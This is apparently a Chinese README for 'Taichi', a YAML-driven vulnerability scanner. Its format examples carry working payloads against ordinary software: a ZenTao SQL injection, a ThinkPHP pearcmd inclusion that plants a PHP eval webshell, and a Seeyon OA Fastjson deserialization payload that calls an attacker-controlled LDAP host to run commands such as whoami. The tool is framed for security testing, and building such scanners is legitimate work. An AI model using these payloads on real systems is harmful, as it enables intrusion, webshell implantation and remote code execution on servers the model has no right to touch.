# Taichi

持续更新中

# 历史更新

**2023.3.24**

- 新增识别poc功能

- 新增扫描多个poc功能

- 适配[CVE-2023-28432](https://mp.weixin.qq.com/s/vpI3C575BxSPzHNi_oF60w)


**2023.2.35**

- 新增poc名称显示

- 新增蓝凌OA poc

**2023.3.26**

- 重构部分代码，删除attack.py
- 取消type参数
- 新增致远OA poc
- 适配dns探测
- 适配fastjson反序列化

**2023.3.28**

- 增加status参数
- 新增通达OA poc

**2023.3.29**

- 删除 `http://`
- 优化文档

# 前言

开发这款工具的目的是为了让安全从业者，刚接触安全初学者更快编写poc。当然，我也知道有nuclei这样成熟好用的工具，但是自己动手丰衣足食，所以这款工具就诞生了。（大佬勿喷）

目前poc以及程序测试不多（有的漏洞几乎找不到了），为了提高效率，我一直在增加poc，所以可能会有较多bug，请见谅。

**发现bug或者有建议欢迎联系我，我会尽我所能满足各位的要求。**

# 介绍

支持自定义poc的漏洞扫描框架

# 使用方法

```
python3 Taichi.py -h
usage: Taichi.py [-h] [-rh remote_host] [-f file_path] [-o outfile_path]
                 [-t thread_num] [-p poc_path] [-a all poc or exp]

Taichi by atk7r

options:
  -h, --help            show this help message and exit
  -rh remote_host, --rhost remote_host
                        Please input host to scan.
  -f file_path, --file file_path
                        Please input file path to scan.
  -o outfile_path, --outfile outfile_path
                        Please input path for output file.
  -t thread_num, --thread thread_num
                        Please input thread number.
  -p poc_path, --poc poc_path
                        Please input poc path to scan.
  -a all poc or exp, --all all poc or exp
                        Please input poc path to scan.
```

### 扫描单个目标

```
python3 Taichi.py -rh https://123.123.123.123 -p poc.yaml
python3 Taichi.py -rh https://123.123.123.123 -a /root/Taichi/pocs
```

### 扫描多个目标

```
python3 Taichi.py -f target.txt -p poc.yaml -o result.txt
python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt
```

### 多线程扫描

```
python3 Taichi.py -f target.txt -p poc.yaml -o result.txt -t 5
python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt -t 5
```

# 文件说明

## 目录

```
|
|--------- configuration(配置文件)
|
|--------- model(模式文件)
|
|--------- pocs(poc文件)
```

## yaml格式

**注意：yaml文件中参数的位置不可以改变**

**实际上yaml都是一样的，我这里列出了四种不同情况供大家参考**

### 第一种情况yaml格式

```
#poc名称
- name:
  - name: "CNVD-2022-42853"

#请求方式
- method:
  - method: "post"

#漏洞的位置
- url:
  - url : "/zentao/user-login.html"

#payload
- payload:
  - payload: "account=admin' and (select extractvalue(1,concat(0x7e,(MD5(007)),0x7e)))#"

#response包里的状态码
- status:
  - status: "200"

#response包里的关键字
- word:
  - word:
      - "8f14e45fceea167a5a36dedd4bea254"

#第二次访问的 请求方式
- method-V:
  - method: "isNone"

#第二次访问的url位置
- verify:
  - verify : "isNone"

#cmd 为了适配Java反序列化漏洞
- cmd:
  - cmd : "isNone"
```

#### name

poc名称，用于扫描时显示

#### method

reques的方式，根据自己需求来定

#### url

因为我在采用了url+<拼接内容>这样的方法来访问url，例如：http://192.168.0.1/a/b/b.jsp，就要把/a/b/b.jsp填入url参数

#### payload

顾名思义就是payload

#### status

response包里的状态码，根据burp的poc填写

#### word

response包里的关键字，目前只能写一个，根据burp的poc填写

#### method-V

不需要的时候写成

```
"isNone"
```

#### verify

不需要的时候写成

```
"isNone"
```

#### cmd

不需要的时候写成

```
"isNone"
```

### **以下就只介绍和不一样的地方**

### 第二种情况yaml格式

```
#poc名称
- name:
  - name: "thinkphp_rce"

#请求方式
- method:
  - method: "post"

#漏洞的位置
- url:
  - url : "/public/index.php"

#payload
- payload:
  - payload: "lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['cmd']);?>+/var/www/html/shell.php"

#response包里状态码
- status:
  - status: "200"

#response包里的关键字
- word:
  - word:
      - "php_dir"

#第二次访问的 请求方式
- method-V:
  - method: "get"

#第二次访问的url位置
- verify:
  - verify : "/shell.php?cmd=phpinfo();"

#cmd 为了适配Java反序列化漏洞
- cmd:
  - cmd : "isNone"
```

**二次访问：字面意思就是第二次访问，因为有的漏洞上传webshell，需要访问webshell证明漏洞存在，就要进行二次访问webshell**

#### word

response包的关键词，这里的关键字是**二次请求**response包的关键字，也就是说word始终是最后一个response包的关键字。用于判断漏洞是否存在，目前只可以支持一个参数

#### method-V

二次访问的请求方式，根据自己需求来

#### verify

这个地方就是上面说的二次访问验证webshell的地方，如果你传了webshell，这个地方就填入你webshell的路径，例如：http://192.168.0.1/a/b/b.jsp，那这个地方就填入/a/b/b.jsp

### 第三种情况yaml格式

```
#poc名称
- name:
  - name: "SeeyouOA_A8_status_jsp_sensitive_information_disclosure1"

#请求方式
- method:
  - method: "get"

#漏洞的位置
- url:
  - url : "/seeyon/management/status.jsp"

#payload
- payload:
  - payload: "isNone"

#response包里状态码
- status:
  - status: "200"

#response包里的关键字
- word:
  - word:
      - "OS"

#第二次访问的 请求方式
- method-V:
  - method: "isNone"

#第二次访问的url位置
- verify:
  - verify : "isNone"

#cmd 为了适配Java反序列化漏洞
- cmd:
  - cmd : "isNone"
```

#### payload

```
  - payload: "isNone"
```

这种无payload，信息泄露用这种较多

### 第四种情况yaml格式

```
#poc名称
- name:
  - name: "SeeyouOA_Fastjson_Deserialization"

#请求方式
- method:
  - method: "post"
  
#漏洞的位置
- url:
  - url : "/seeyon/main.do?method=changeLocale"

#payload
- payload:
  - payload: '_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<IP>:1289/TomcatBypass/TomcatEcho","autoCommit":true}}'

#response包里状态码
- status:
  - status: "200"

#response包里的关键字
- word:
  - word:
      - "root"

#第二次访问的 请求方式
- method-V:
  - method: "isNone"

#第二次访问的url位置
- verify:
  - verify : "isNone"

#cmd 为了适配Java反序列化漏洞
- cmd:
  - cmd : "whoami"
```

#### cmd

```
  - cmd : "whoami"
```

这种cmd有参数，之所以这样写，是因为request包有cmd参数

```
POST /seeyon/main.do?method=changeLocale HTTP/1.1
Host: x.x.x.x
Content-Length: 221
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

cmd: ipconfig   #！！！这里！！！

Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=26FF8158707BB0896A3ACD66EB92DD41; loginPageURL=
Connection: close

_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xxx.xxx.xxx:1289/TomcatBypass/TomcatEcho","autoCommit":true}}
```

**总之，所有的参数都是重要的，参数错误或位置错误会导致报错或扫描失败，所以请不要随意更改参数位置并正确填写参数！**

